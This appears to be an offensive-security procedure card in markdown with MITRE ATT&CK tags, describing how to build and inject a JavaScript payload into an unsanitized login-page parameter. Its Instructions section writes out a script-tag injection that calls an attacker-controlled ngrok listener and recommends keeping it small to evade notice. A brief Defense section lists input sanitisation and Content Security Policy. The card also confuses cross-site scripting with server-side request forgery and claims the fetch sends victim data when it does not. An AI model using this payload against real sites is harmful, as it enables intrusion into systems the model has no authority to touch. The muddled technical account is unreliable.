---
id: proc-craft-fetch-payload
tags:
  - ssrf
  - javascript
  - fetch-api
  - payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:01.845Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-JavaScript-Fetch-SSRF-Payload

## Summary

This procedure involves creating a JavaScript payload that leverages the fetch API to perform a cross-domain request from the target server to an attacker-controlled endpoint, exploiting SSRF in unsanitized input parameters like 'source' on a login page.

## Description

The payload is designed for injection into URL parameters on public-facing web applications. When processed server-side (potentially via reflected XSS-like behavior), it executes fetch() to send victim data externally. This targets environments vulnerable to client-side script injection leading to server-initiated requests. Expected outcomes include request routing to the listener with full headers.

## Requirements

1. Ngrok URL from listener setup
2. Knowledge of target parameter (e.g., 'source')
3. Basic JavaScript understanding for payload validation

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all URL parameters to prevent script injection
- Disable or restrict fetch API usage in server-rendered content
- Employ Content Security Policy (CSP) to block unauthorized script execution

## Objectives

1. Generate executable JavaScript for SSRF triggering
2. Ensure cross-domain request capability
3. Minimize payload size for evasion

## Instructions

### Step 1: Define Payload Structure

**Context**: Build the core script tag with fetch call targeting the ngrok endpoint.

**Instructions**: Construct: '><script>fetch('https://abc123.ngrok.io')</script>' where https://abc123.ngrok.io is your ngrok URL.

> This closes any open tags (e.g., from reflected input) and injects the script. Test in a local HTML file to verify fetch execution.

### Step 2: Prepare for Injection

**Context**: Ensure the payload is URL-safe and ready for parameter appending.

**Instructions**: If needed, URL-encode special characters, but in this case, direct injection works due to lack of sanitization.

> Expected: Payload string validated without syntax errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- javascript
- injection
